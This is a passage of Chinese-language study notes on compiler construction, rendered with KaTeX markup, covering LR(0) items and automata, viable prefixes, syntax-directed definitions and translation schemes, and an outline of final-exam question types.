xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mi>A</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">\alpha A c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span></span></span></span></eq>相对于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的直接短语</li></ul></li><li><p>句型的最左直接短语称为句柄</p></li><li><p>在一个句型对应的语法树中</p><ul><li>以某非终结符为根的两代以上的字数的所有末端节点从左到右排列就是对于该非终结符的一个短语</li><li>如果子树只有两代，则短语为直接短语</li><li>最左的两代子树末端就是句柄</li></ul></li><li><p>LR文法采用句柄进行规约</p></li></ul><h3 id="lr(0)%E9%A1%B9%E7%9B%AE" tabindex="-1">LR(0)项目</h3><p>在每个产生式右部添加一个圆点，表示我们在分析过程中已经看到了产生式的哪些部分，以及我们希望下一个字符是什么</p><ul><li><p>如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>X</mi><mi>Y</mi><mi>Z</mi></mrow><annotation encoding="application/x-tex">A\rightarrow XYZ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></eq>有四个项目</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mo separator="true">⋅</mo><mi>X</mi><mi>Y</mi><mi>Z</mi></mrow><annotation encoding="application/x-tex">A\rightarrow ·XYZ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>X</mi><mo separator="true">⋅</mo><mi>Y</mi><mi>Z</mi></mrow><annotation encoding="application/x-tex">A\rightarrow X·YZ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>X</mi><mi>Y</mi><mo separator="true">⋅</mo><mi>Z</mi></mrow><annotation encoding="application/x-tex">A\rightarrow XY·Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>X</mi><mi>Y</mi><mi>Z</mi><mo separator="true">⋅</mo></mrow><annotation encoding="application/x-tex">A\rightarrow XYZ·</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mpunct">⋅</span></span></span></span></eq></li></ul></li><li><p>称<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi><mo separator="true">⋅</mo></mrow><annotation encoding="application/x-tex">A\rightarrow \alpha ·</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mpunct">⋅</span></span></span></span></eq>为“规约项目”</p><ul><li>规约项目<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>S</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo>→</mo><mi>α</mi><mo separator="true">⋅</mo></mrow><annotation encoding="application/x-tex">S^{&#x27;}\rightarrow \alpha ·</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9425em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mpunct">⋅</span></span></span></span></eq>，称为“接受项目”</li></ul></li><li><p><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi><mo separator="true">⋅</mo><mi>a</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">A\rightarrow \alpha · a \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq> ,称为“移进项目”</p></li><li><p><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>B</mi><mo separator="true">⋅</mo><mi>a</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">A\rightarrow B · a \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq> ,称为“待约项目”</p></li><li><p>内核项：包括初始项<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>S</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo>→</mo><mo separator="true">⋅</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">S^{&#x27;}\rightarrow·S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9425em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq>以及点不再最左端的所有项</p></li><li><p>非内核项：除<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>S</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo>→</mo><mo separator="true">⋅</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">S^{&#x27;}\rightarrow·S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9425em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq>以外的点在最左端的所有项</p></li></ul><p>以LR(0)项目集为基础，构造LR(0)自动机，做出语法分析器</p><h4 id="lr(0)%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%9A%84%E6%9E%84%E9%80%A0" tabindex="-1">LR(0)自动机的构造</h4><ul><li>构造分析表中的状态<br>假设I为文法的任一项目集(开始时仅包含S’→.S，S '为拓广文法的识别符号)，重复下述步骤求CLOSURE(I)：<ol><li>I的任何项目均属于CLOSURE(I)</li><li>如果A→α.Bβ属于CLOSURE(I)，则所有B→.γ也属于CLOSURE(I)。<br>上述工作重复到CLOSURE(I)不再扩大为止，此CLOSURE(I)即为所求的一个项目子集。</li></ol></li></ul><h4 id="%E6%B4%BB%E5%89%8D%E7%BC%80" tabindex="-1">活前缀</h4><ul><li><p>句柄的识别需要借助实际句型中的信息。在得到一个规范句型的完整句柄之前所识别的符号串称为规范句型的活前缀。</p></li><li><p>LR(0)自动机本质是DFA，那么就可以识别串，能被该自动机识别的串称为活前缀</p></li></ul><h4 id="lr(0)%E5%88%86%E6%9E%90%E8%A1%A8" tabindex="-1">LR(0)分析表</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/LR(0)%E5%88%86%E6%9E%90%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0.jpg" alt></p><ul><li>移进规约冲突<ul><li>左结合选移进</li><li>右结合选归约</li></ul></li></ul><h2 id="5%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91" tabindex="-1">5语法制导翻译</h2><h3 id="%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91%E7%AE%80%E4%BB%8B" tabindex="-1">语法制导翻译简介</h3><ul><li>属性文法：对某个上下文无关文法，为每个文法符号指定一组属性，且为文法中的每个产生式附加一段属性计算方法——语义规则/语义动作/语义子程序，则称该文法为属性文法。<br>原文法称为基础文法<ul><li>属性值的计算，由语法分析过程中产生的语法分析树相应节点的环境推导出来 — 属性的联编/绑定<ul><li>静态属性：执行前联编，如数的有效位数</li><li>动态属性：在执行期间联编，如表达式的值</li></ul></li></ul></li><li>语法制导定义SDD<ul><li>定义与文法符号相关联的属性集</li><li>定义与产生式相关联的一组语义规则</li></ul></li><li>(语法制导的)翻译方案<ul><li>基本思想：在语法分析的过程中，依随分析的过程，根据每个产生式添加的语义动作进行翻译。一旦某个产生式被选用于推导或归约，就执行其相应的语义动作，完成预定的翻译工作</li></ul></li></ul><h3 id="%E5%B1%9E%E6%80%A7%E5%88%86%E7%B1%BB" tabindex="-1">属性分类</h3><ul><li><p>综合属性（自下而上得传递消息）</p><ul><li>语法规则上：根据产生式右部的符号属性计算左部被定义的符号的综合属性</li><li>语法树上：根据子节点的属性和父节点自身的属性计算父节点的综合属性</li></ul></li><li><p>继承属性（自上而下传递消息）</p><ul><li>语法规则上：根据右部候选式中的符号的属性和左部被定义的符号的属性计算右部候选式中符号的继承属性</li><li>语法树上：根据父节点和兄弟节点的属性计算子节点的继承属性</li></ul></li><li><p>终结符只有综合属性，并且这些综合属性由词法分析器提供</p></li><li><p>非终结符既有综合属性也可有继承属性，文法的开始符号没有继承属性，除非另加说明</p></li><li><p>文法符号的综合属性集合和继承属性集合的交集应该为空</p></li><li><p>对出现在产生式右边的继承属性和出现在产生式右边的综合属性都必须提供一个计算规则。属性计算规则中只能使用相应产生式中的文法符号的属性</p></li><li><p>出现在产生式左边的继承属性和出现在产生式右边的综合属性不由所给的产生式的属性计算规则计算，而是由其它产生式的属性规则计算或者由属性计算器的参数提供</p></li></ul><h3 id="sdd%E6%B1%82%E5%80%BC%E9%A1%BA%E5%BA%8F%EF%BC%8C%E5%B1%9E%E6%80%A7%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95" tabindex="-1">SDD求值顺序，属性计算方法</h3><ul><li>依赖图<br>用一个有向图描述了某个语法分析树中的属性实例之间的依赖关系，若属性x.a的值依赖于属性y.b的值，则加入一条同y.b到x.a的有向边</li></ul><h3 id="sdd-%E5%88%86%E7%B1%BB" tabindex="-1">SDD 分类</h3><ul><li>S-属性定义：仅使用综合属性的SDD<ul><li>可以按照语法分析树节点的任何自底向上的顺序来计算各个属性值</li></ul></li><li>L-属性定义<ul><li>一个SDD是L-属性，当且仅当它的每个属性要么都是综合属性(这里包含了S-属性)，要么是满足以下条件的继承属性<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><msub><mi>x</mi><mn>1</mn></msub><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>x</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">A\rightarrow x_1x_2...x_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,右部符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的继承属性仅依赖于：<ol><li>A的继承属性</li><li>产生式中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>左边<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>x</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">x_1,x_2,...x_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></eq>的属性</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>本身的属性</li></ol></li></ul></li></ul><h3 id="sdt-%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91%E6%96%B9%E6%A1%88" tabindex="-1">SDT 语法制导翻译方案</h3><p>SDD：只给出了语义规则(属性计算的定义)，并没有给出计算的次序，所以要通过依赖图寻求计算顺序</p><p>SDT：既有关于属性计算的定义，又有计算的次序<br>SDT将语义动作用花括号括起来，作为一种程序片段，插入到产生式右部的合适位置</p><ul><li><p>设计翻译模式的原则：必须保证某个语义动作引用一个属性时，该属性已经被定义了</p><ol><li>当语义规则只引用综合属性是，将动作放到产生式末尾</li><li>当语义规则中有继承属性，也有继承属性时<ol><li>产生式右部的符号的继承属性必须在符号之前计算出来</li><li>一个动作不能引用这个动作右边的符号的属性</li><li>产生式左部的综合属性只有在它所引用的所有属性都计算出来后才能计算，一般动作放在最右部</li></ol></li></ol></li><li><p>SDT实现了语法分析和语义分析同时进行，基于自下而上的语法分析方式</p></li><li><p>语法分析能得到语法树</p><ul><li>仅指明各个文法符号之间的传递关系</li><li>不能决定文法符号间应该有什么样的运算，这是由语义分析决定的</li></ul></li></ul><h2 id="%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0" tabindex="-1">期末复习</h2><p><a href="https://www.bilibili.com/video/BV1SB4y1S7Sc/?p=4&amp;spm_id_from=pageDriver&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">跌的视频</a><br>共7道</p><h3 id="%E7%AC%AC%E4%B8%80%E9%81%93-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">第一道 词法分析</h3><ol><li>求NFA接受字符串的过程</li><li>NFA转DFA，并画出状态转换图</li><li>DFA的最小化</li><li>自然语言描述NFA的语言</li><li>NFA/DFA转正规表达式</li></ol><h3 id="%E7%AC%AC%E4%BA%8C%E9%81%93-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">第二道 自上而下语法分析</h3><ol><li><p>最左推导</p><ol><li>总是选择每个句型最左边的非终结字符进行替换</li></ol></li><li><p>消除左递归</p><ol><li>先消除间接左递归</li><li>再消除直接左递归</li></ol></li><li><p>求FIRST，FOLLOW集合</p><ul><li>计算FOLLOW集合<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FOLLOW(U)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span></span></span></span></eq>的求法，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>a</mi><mi mathvariant="normal">∣</mi><mi>S</mi><msup><mo>→</mo><mo lspace="0em" rspace="0em">∗</mo></msup><mo>…</mo><mi>U</mi><mi>a</mi><mo>…</mo><mo separator="true">,</mo><mi>a</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">FOLLOW(U)=\{a|S\rightarrow^{*}\dots Ua\dots,a\in V_T\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span 